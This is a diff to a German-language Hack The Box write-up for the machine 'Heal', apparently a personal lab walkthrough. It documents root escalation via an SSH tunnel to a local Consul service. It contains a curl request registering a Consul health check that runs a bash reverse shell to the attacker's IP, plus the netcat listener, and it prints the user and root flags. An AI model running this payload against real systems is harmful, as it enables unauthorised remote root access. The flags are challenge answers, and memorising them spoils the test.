@@ -604,17 +604,180 @@ wie man sehen kann ist das userflag:
 
 `d18da46a08d09ab95187edcc99ae1188`
 
-HTB user flag owned:
+### HTB user flag owned:
  
-![alt text](Screenshot_2025-04-19_21_40_41.png)
+![alt text](Screenshot_2025-04-20_15_31_17.png)
+
+## Root Flag
+
+Nach dem Zugriff als Benutzer ron habe ich mit netstat überprüft, welche Ports auf der Maschine geöffnet waren:
+
+```bash
+netstat -tulnp | grep LISTEN
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -   
+```
+
+Interessanter Output:
+
+`tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -`
+
+Der Dienst auf Port 8500 hörte nur lokal - das bedeutet: ich musste ihn über einen SSH tunnel zugänglich machen.
+SSH Port Forwarding zur lokalen Maschine
+
+┌──(kali㉿kali)-[~]
+└─$ ssh -L 8500:127.0.0.1:8500 ron@10.10.11.46
+
+Verbindung erfolgreich:
+
+```
+──(kali㉿kali)-[~]
+└─$ ssh -L 8500:127.0.0.1:8500 ron@10.10.11.46
+
+ron@10.10.11.46's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sun Apr 20 06:57:25 PM UTC 2025
+
+  System load:  0.01              Processes:             272
+  Usage of /:   84.6% of 7.71GB   Users logged in:       0
+  Memory usage: 27%               IPv4 address for eth0: 10.10.11.46
+  Swap usage:   0%
+
+  => There are 4 zombie processes.
 
 
+Expanded Security Maintenance for Applications is not enabled.
+
+29 updates can be applied immediately.
+18 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
 
 
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
 
+Last login: Sat Apr 19 07:40:49 2025 from 10.10.14.29
+ron@heal:~$
+```
 
+Danach konnte ich im Browser auf http://localhost:8500 zugreifen und sah das Consul UI.
 
+![alt text](Screenshot_2025-04-20_15_15_55.png)
 
+### Exploiting Consul via HTTP API
 
+Mit Consuls HTTP API lässt sich ein "Health Check" registrieren, der beliebige Kommandos ausführt. Ich nutzte das, um eine Root Reverse shell zu bekommen:
 
+```
+ron@heal:~$ curl -X PUT -d '{
+  "ID": "lyfe-root",
+  "Name": "lyfe-root",
+  "Address": "127.0.0.1",
+  "Port": 80,
+  "Check": {
+    "DeregisterCriticalServiceAfter": "90m",
+    "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.199/9001 0>&1"],
+    "Interval": "10s"
+  }
+}' http://localhost:8500/v1/agent/service/register
+```
+
+#### Listener auf Kali öffnen
+
+Parallel auf meinem Kali Terminal:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9001
+
+listening on [any] 9001 ...
+connect to [10.10.14.199] from (UNKNOWN) [10.10.11.46] 59444
+bash: cannot set terminal process group (143669): Inappropriate ioctl for device
+bash: no job control in this shell
+root@heal:/# whoami
+whoami
+root
+```
+
+shell popt, root zugriff bestätigt
+
+#### Root Flag lesen
+
+als erstes die directories/files listen: 
+
+```
+root@heal:/# ls -la  
+ls -la
+total 72
+drwxr-xr-x  19 root root  4096 Dec  8 13:57 .
+drwxr-xr-x  19 root root  4096 Dec  8 13:57 ..
+lrwxrwxrwx   1 root root     7 Feb 17  2023 bin -> usr/bin
+drwxr-xr-x   4 root root  4096 Dec  8 12:59 boot
+dr-xr-xr-x   2 root root  4096 Dec  8 13:57 cdrom
+drwxr-xr-x  20 root root  4020 Apr 18 10:01 dev
+drwxr-xr-x 117 root root  4096 Jan  7 15:01 etc
+drwxr-xr-x   4 root root  4096 Dec  9 12:53 home
+lrwxrwxrwx   1 root root     7 Feb 17  2023 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Feb 17  2023 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Feb 17  2023 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Feb 17  2023 libx32 -> usr/libx32
+drwx------   2 root root 16384 Sep  4  2024 lost+found
+drwxr-xr-x   2 root root  4096 Feb 17  2023 media
+drwxr-xr-x   2 root root  4096 Dec  8 13:57 mnt
+drwxr-xr-x   2 root root  4096 Dec  8 13:57 opt
+dr-xr-xr-x 327 root root     0 Apr 18 10:01 proc
+drwx------   7 root root  4096 Apr 18 10:09 root
+drwxr-xr-x  31 root root   900 Apr 20 18:57 run
+lrwxrwxrwx   1 root root     8 Feb 17  2023 sbin -> usr/sbin
+drwxr-xr-x   2 root root  4096 Dec  8 13:57 srv
+dr-xr-xr-x  13 root root     0 Apr 18 10:01 sys
+drwxrwxrwt  14 root root  4096 Apr 20 18:48 tmp
+drwxr-xr-x  14 root root  4096 Dec  8 13:57 usr
+drwxr-xr-x  13 root root  4096 Dec  8 13:57 var
+```
+Beim dutchstöbern habe ich folgendes file gefunden: `root.txt`.
+
+Jetzt musste ich es nur noch lesen: 
+
+```
+root@heal:/# cat /root/root.txt
+cat /root/root.txt
+7abbed710c05c4d217992b4d3efc3721
+```
+
+wie man sehen kann ist das root flag: `7abbed710c05c4d217992b4d3efc3721`
+
+![alt text](Screenshot_2025-04-20_15_24_38.png)
+
+###  HTB Root Flag owned: 
+
+![alt text](Screenshot_2025-04-20_15_32_57.png)
+
+## HTB Heal – Komplett owned
+
+- **User Flag:** `d18da46a08d09ab95187edcc99ae1188`
+- **Root Flag:** `7abbed710c05c4d217992b4d3efc3721`
+
+![alt text](Screenshot_2025-04-20_15_32_08.png)
 
